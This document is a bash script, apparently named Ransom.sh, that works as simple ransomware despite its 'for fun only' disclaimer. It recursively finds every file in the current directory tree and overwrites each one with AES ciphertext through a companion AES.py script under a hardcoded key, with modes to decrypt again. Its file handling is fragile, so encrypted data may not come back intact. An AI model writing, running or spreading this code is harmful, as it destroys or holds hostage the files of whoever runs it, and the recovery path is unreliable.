#!/bin/bash

# THIS PROGRAM IS INTEDED FOR HAVING FUN ONLY
# DO NOT USE IT ON OTHERS
# ONLY EXECUTE IN A SAFE ENVIRONMENT
# EXECUTION WILL BE ON YOUR OWN REPONSIBILITY

echo -n "Would You Like To Encrypt Or Decrypt (1/2/3/4)>"
read mode
if [ $mode = '1' ]
then                     
    echo "==================================================="
    echo "===============GATHERING INFORMATION==============="
    files=`find . -path ./.git -prune -false -o -type f`
    files=($(echo $files | tr '\b' '\n'))
    echo $files
    numOptions=${#files[@]}
    for (( counter=0; counter<${numOptions}; counter++))
    do
        if [ ${files[counter]} = './AES.py' -o ${files[counter]} = './Ransom.sh' ]
        then
            unset -v 'files[$counter]'
            continue
        fi
        echo ${files[counter]}
        data=`cat ${files[counter]}`
        encData=`./AES.py 'Joe@0192646968' "$data" 1`
        echo $encData > ${files[counter]}
    done
elif [ $mode = '2' ]
then
    echo "==================================================="
    echo "===============GATHERING INFORMATION==============="
    files=`find . -path ./.git -prune -false -o -type f`
    files=($(echo $files | tr '\b' '\n'))
    numOptions=${#files[@]}
    echo $numOptions
    for (( counter=0; counter<${numOptions}; counter++))
    do  
        if [ ${files[counter]} = './AES.py' -o ${files[counter]} = './Ransom.sh'
]
        then
            unset -v 'files[$counter]'
            continue
        fi

        echo ${files[counter]}
        data=`cat ${files[counter]}`
        decData=`./AES.py 'Joe@0192646968' "$data" 2`
        echo $decData > ${files[counter]}
    done
elif [ $mode = '3' ]
then
    echo "==================================================="
    echo "===============GATHERING INFORMATION==============="
    files=`find . -path ./.git -prune -false -o -type f`
    files=($(echo $files | tr '\b' '\n'))
    echo $files
    numOptions=${#files[@]}
    for (( counter=0; counter<${numOptions}; counter++))
    do
        if [ ${files[counter]} = './AES.py' -o ${files[counter]} = './Ransom.sh' ]
        then
            unset -v 'files[$counter]'
            continue
        fi
        echo ${files[counter]}
        data=`xxd ${files[counter]}`
        encData=`./AES.py 'Joe@0192646968' "$data" 1`
        echo $encData > ${files[counter]}
    done
elif [ $mode = '4' ]
then
    echo "==================================================="                   
    echo "===============GATHERING INFORMATION==============="                   
    files=`find . -path ./.git -prune -false -o -type f`                         
    files=($(echo $files | tr '\b' '\n'))                                        
    numOptions=${#files[@]}                                                      
    #echo $numOptions                                                             
    for (( counter=0; counter<${numOptions}; counter++))                         
    do                                                                           
        if [ ${files[counter]} = './AES.py' -o ${files[counter]} = './Ransom.sh' ]                                                                                
        then                                                                     
            unset -v 'files[$counter]'     
            continue
        fi                     
        echo ${files[counter]}                                                   
        data=`cat ${files[counter]}`   
        decData=`./AES.py 'Joe@0192646968' "$data" 2 > TEST`
        #echo $decData > ${files[counter]}
        data=`xxd -r TEST > ${files[counter]}`
        echo -e `rm TEST`
    done       
fi
